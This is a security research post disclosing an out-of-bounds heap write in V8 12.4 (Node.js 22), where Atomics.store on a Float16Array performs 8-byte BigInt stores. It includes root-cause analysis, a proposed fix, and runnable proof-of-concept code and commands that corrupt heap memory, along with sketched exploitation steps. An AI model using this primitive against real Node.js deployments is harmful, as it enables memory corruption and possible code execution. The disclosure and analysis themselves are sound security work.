---
layout: post
title: "V8 12.4.254.21 — OOB Heap Write via Atomics.store on Float16Array"
date: 2026-02-09
categories: research
tags: [v8, javascript, node, heap, oob, type-confusion]
description: "Atomics.store() on a Float16Array accepts BigInt values without type rejection, performing an 8-byte atomic store into a 2-byte element slot. The result is an attacker-controlled OOB write primitive reaching up to 3x the buffer size past the boundary."
---

`Atomics.store()` on a `Float16Array` accepts `BigInt` values without proper type rejection, performing a **BigInt64 (8-byte) atomic store** into a **Float16 (2-byte) element slot**. The byte offset is calculated using BigInt64 stride (`index * 8`) instead of Float16 stride (`index * 2`), resulting in:

1. **Out-of-bounds writes** past the end of the underlying buffer
2. **Corruption of adjacent elements** within the buffer
3. **Heap metadata corruption** demonstrated by `free(): invalid size` errors

This provides an **attacker-controlled OOB write primitive** with full 8-byte value control, capable of writing up to 48+ bytes past the buffer boundary.

**Severity:** HIGH (Heap OOB Write — potential RCE)
**Type:** Type confusion in Atomics builtin — OOB write
**Affected:** V8 12.4.254.21-node.33 (Node.js 22.x LTS), with `--js-float16array`
**Fixed in:** V8 14.2+ (Chromium 142+) — Float16 enum position moved
**Node.js 22 LTS:** STILL VULNERABLE (Active LTS until Oct 2025)
**Chrome:** Fixed before Float16Array shipped by default in Chrome 135 (April 2025)
**Feature Status:** Behind `--js-float16array` in Node.js 22; enabled by default in Chrome 135+

---

## Proof of Concept

### Minimal OOB Write

```javascript
// node --js-float16array
// Write 8 bytes at byte offset 16 in a 16-byte buffer (8 bytes OOB)
const sab = new SharedArrayBuffer(16);  // 16 bytes = 8 Float16 elements
const f16 = new Float16Array(sab);

// Index 2 passes bounds check (2 < 8)
// But BigInt64 store writes 8 bytes at offset 2*8=16, past buffer end
Atomics.store(f16, 2, 0xDEADBEEFCAFEBABEn);
// Writes 8 bytes to heap memory PAST the buffer boundary
```

### Controlled Adjacent Element Corruption

```javascript
// node --js-float16array
const sab = new SharedArrayBuffer(64);
const f16 = new Float16Array(sab);   // 32 Float16 elements
const u8 = new Uint8Array(sab);

// Fill buffer with known pattern
for (let i = 0; i < 64; i++) u8[i] = 0xAA;

// Write BigInt at Float16 index 0: overwrites bytes 0-7 (elements 0-3)
Atomics.store(f16, 0, 0x4142434445464748n);
// Bytes 0-7 now: [0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41]
// Elements f16[0] through f16[3] corrupted with attacker-controlled data
```

### Heap Corruption Demonstration

```javascript
// node --js-float16array
const sab = new SharedArrayBuffer(16);
const f16 = new Float16Array(sab);

Atomics.store(f16, 7, 0x4141414141414141n);  // 48 bytes past buffer
// Process crashes on exit: "free(): invalid size" (heap metadata corrupted)
```

---

## Vulnerability Analysis

### Root Cause

In V8 12.4, `FLOAT16_ELEMENTS` is inserted into the `ElementsKind` enum at position 6 — **between `INT32_ELEMENTS` (5) and `BIGUINT64_ELEMENTS` (7)**:

```
UINT8(0), INT8(1), UINT16(2), INT16(3), UINT32(4), INT32(5),
  FLOAT16(6),  <-- INSERTED HERE
BIGUINT64(7), BIGINT64(8), UINT8_CLAMPED(9), FLOAT32(10), FLOAT64(11)
```

This placement has two consequences.

**Bug 1: ValidateIntegerTypedArray fails to reject Float16Array**

In `builtins-sharedarraybuffer-gen.cc` line 133-136:

```cpp
Branch(Int32LessThanOrEqual(elements_kind,
    Int32Constant(LAST_VALID_ATOMICS_TYPED_ARRAY_ELEMENTS_KIND)),
    &not_float_or_clamped, &invalid);
```

`LAST_VALID_ATOMICS_TYPED_ARRAY_ELEMENTS_KIND = BIGINT64_ELEMENTS = 8`.
`FLOAT16_ELEMENTS = 6`, so `6 <= 8` is TRUE — Float16 passes validation.

**Bug 2: AtomicsStore treats Float16 as BigInt64**

In `builtins-sharedarraybuffer-gen.cc` line 357:

```cpp
GotoIf(Int32GreaterThan(elements_kind, Int32Constant(INT32_ELEMENTS)), &u64);
```

`FLOAT16_ELEMENTS = 6 > INT32_ELEMENTS = 5` is TRUE — Float16 is routed to the BigInt64 store path (`&u64`), which:

1. Calls `ToBigInt(value)` — succeeds when a BigInt is passed
2. Extracts 8 raw bytes from the BigInt via `BigIntToRawBytes`
3. Calls `AtomicStore64(backing_store, WordShl(index_word, 3), ...)` — stores 8 bytes at byte offset `index * 8` (BigInt64 stride, not Float16's `index * 2`)

The fix in newer V8 versions moved `FLOAT16_ELEMENTS` to position 11 (after FLOAT64), outside the valid atomics range, so the range check rejects it.

### OOB Calculation

For a buffer of `B` bytes backing a Float16Array:

- Float16 element count: `N = B / 2`
- Valid index range: `[0, N-1]`
- BigInt64 byte offset: `index * 8`
- BigInt64 write end: `index * 8 + 7`
- OOB begins when: `index >= (B - 7) / 8`
- Maximum OOB offset: `(N-1) * 8 + 7 - B = 3B - 1`

| Buffer Size | F16 Elements | First OOB Index | Max OOB Bytes |
|-------------|--------------|-----------------|---------------|
| 16 bytes    | 8            | 2               | 48 past end   |
| 32 bytes    | 16           | 4               | 96 past end   |
| 64 bytes    | 32           | 8               | 192 past end  |
| 256 bytes   | 128          | 32              | 768 past end  |
| 1024 bytes  | 512          | 128             | 3072 past end |

The OOB range scales as **3x the buffer size**.

### Primitive Capabilities

| Property       | Value                          |
|----------------|--------------------------------|
| Write size     | Always 8 bytes (BigInt64)      |
| Value control  | Full (any 64-bit BigInt)       |
| Offset control | `index * 8` (stride of 8)      |
| Alignment      | 8-byte aligned                 |
| Atomicity      | Atomic (sequentially consistent) |
| Buffer types   | ArrayBuffer, SharedArrayBuffer |

### Affected Operations

| Atomics Operation           | Float16Array Behavior          |
|-----------------------------|--------------------------------|
| `Atomics.store`             | **OOB WRITE (accepts BigInt)** |
| `Atomics.load`              | SIGILL crash (Unreachable)     |
| `Atomics.exchange`          | SIGILL crash                   |
| `Atomics.add/sub/and/or/xor`| SIGILL crash                   |
| `Atomics.compareExchange`   | SIGILL crash                   |
| `Atomics.wait`              | TypeError (correct)            |
| `Atomics.notify`            | TypeError (correct)            |

Only `Atomics.store` reaches the actual store operation because it converts the value argument first, and BigInt values pass the (incorrect) BigInt conversion. All read-involving operations crash at the load instruction because the CSA Switch has no Float16 case.

---

## Security Impact

### Arbitrary Heap Write

An attacker who can execute JavaScript with `--js-float16array` enabled can:

1. Allocate a small `SharedArrayBuffer` (e.g., 16 bytes)
2. Create a `Float16Array` view over it
3. Call `Atomics.store(f16, index, bigint_value)` to write 8 attacker-controlled bytes at offsets up to 3x the buffer size past the boundary
4. Corrupt adjacent heap objects, metadata, or V8 internal structures

### Exploitation Potential

- **Map pointer corruption:** Overwriting a JSObject's Map pointer creates a type confusion primitive (similar to CVE-2024-4947's exploitation technique)
- **Length field corruption:** Overwriting a FixedArray or TypedArray length field enables arbitrary-length OOB access
- **Chaining:** Combined with a heap spray and an info leak, this primitive could achieve full code execution

### Limitations

- Requires `--js-float16array` flag in Node.js 22 (experimental)
- Write alignment is 8 bytes (stride constraint)
- Write size is fixed at 8 bytes
- No direct OOB read primitive (`Atomics.load` crashes)
- V8 sandbox limits direct impact to V8 heap corruption

---

## Comparison with Known CVEs

| CVE | Class | Similarity |
|-----|-------|------------|
| CVE-2024-4947 | Maglev type confusion, wrong-size write via incorrect offset | Same class |
| CVE-2018-16065 | TypedArray length desync leading to OOB | Same class |
| CVE-2025-5419 | Bounds check elimination with corrupted type feedback | Same result |

---

## Remediation

Add a Float16Array type check **before** value conversion in the Atomics.store builtin:

```cpp
// In AtomicsStore, before ToBigInt conversion:
if (elements_kind == FLOAT16_ELEMENTS) {
  ThrowTypeError(context, MessageTemplate::kNotIntegerTypedArray,
                 maybe_array_or_shared_object);
}
```

All Atomics operations should reject Float16Array with the correct error ("not an integer typed array") rather than crashing or silently accepting BigInt writes.

---

## Reproduction

```bash
# 1. In-bounds corruption (safe to run)
node --js-float16array -e "
const buf = new SharedArrayBuffer(64);
const f16 = new Float16Array(buf);
const u8 = new Uint8Array(buf);
for (let i = 0; i < 64; i++) u8[i] = 0xAA;
Atomics.store(f16, 0, 0x4142434445464748n);
console.log('Bytes 0-7:', Array.from(u8.slice(0,8)).map(x=>x.toString(16)));
// [48, 47, 46, 45, 44, 43, 42, 41] — 8 bytes written, corrupting 3 extra F16 elements
"

# 2. OOB write past buffer
node --js-float16array -e "
const buf = new SharedArrayBuffer(16);
const f16 = new Float16Array(buf);
Atomics.store(f16, 2, 0xDEADBEEFn);
// Writes 8 bytes at byte offset 16 in a 16-byte buffer
"

# 3. Heap metadata corruption (crashes on exit)
node --js-float16array -e "
const buf = new SharedArrayBuffer(16);
const f16 = new Float16Array(buf);
Atomics.store(f16, 7, 0x4141414141414141n);
// free(): invalid size on exit
"
```

---

*Environment: Node.js v22.22.0 · V8 12.4.254.21-node.33 · Kali Linux 6.16.8+kali-amd64 · 2026-02-09*
